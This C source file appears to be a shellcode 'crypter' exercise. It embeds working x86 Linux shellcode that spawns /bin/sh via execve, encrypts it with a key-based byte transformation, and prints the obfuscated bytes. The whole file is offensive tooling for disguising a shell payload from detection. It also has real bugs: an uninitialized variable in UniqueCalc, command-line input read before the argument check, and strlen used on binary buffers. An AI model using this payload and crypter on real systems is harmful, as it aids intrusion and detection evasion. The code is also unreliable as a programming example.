// Filename: customer-crypter.c
// Not a secure algorithm!!


#include<stdio.h>
#include<stdlib.h>
#include<string.h>


// This shellcode spawns a shell by using execve on /bin/sh
unsigned char shellcode[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


// Function which takes each nibble of byte in encryption_key and multiplies their difference and sum
unsigned char NibbleCalc(unsigned char keybyte)
{
	unsigned char nibble_one;
	unsigned char nibble_two;
	unsigned char tmp_result;
	unsigned char result;

	nibble_one = keybyte >> 4;
	nibble_two = keybyte & 0xf;

	result = (nibble_one + nibble_two) * (nibble_one - nibble_two);

	return result;
}


// Function which takes byte in encryption_key and transforms it based on the bytes' position in the encryption_key
unsigned char UniqueCalc(unsigned char keybyte, int i)
{
	unsigned char result;
	unsigned char tmp;

	if (i == 0) {
		result = keybyte;
		tmp = keybyte;
	} else if (i == 1) {
		result = keybyte - tmp;
	} else if (i > 1) {
		result = keybyte / i;
	}

	return result;
}


int main(int argc, char *argv[])
{

unsigned char data_byte;
unsigned char key_byte;
unsigned char key_nibble;
unsigned char key_unique;
unsigned char encrypted_byte;
unsigned char *encryption_key;

int shellcode_len;
int counter;

shellcode_len=strlen(shellcode);
encryption_key = argv[1];
unsigned char encrypted_shellcode[shellcode_len];

// Usage error message
if (argc != 2) 
	{
		printf("Example Usage: ./custom-crypter <ENCRYPTION_KEY>\r\n");
		printf("Exiting...\r\n");
		exit(1);	
	}


// Loop through each character in encryption_key
for (int i=0; i<strlen(encryption_key); i++) 
{
	key_byte = encryption_key[i];
	key_nibble = NibbleCalc(encryption_key[i]);
	key_unique = UniqueCalc(encryption_key[i], i);
	
	// Encrypt shellcode array based on each character in encryption_key
	for (counter=0; counter<shellcode_len; counter++)
	{
		data_byte = shellcode[counter];
		encrypted_byte = data_byte + key_byte + key_nibble + key_unique; 
		encrypted_shellcode[counter] = encrypted_byte;
	}

	// Copy encrypted_shellcode into shellcode for next encryption iteration
	memcpy(shellcode, encrypted_shellcode, sizeof(shellcode));

}

// Print encrypted shellcode byte array
for (int i=0; i<strlen(encrypted_shellcode); i++)
{
	unsigned char final_byte = encrypted_shellcode[i];
	printf("\\x%02x", final_byte);	
}

printf("\r\n");

}
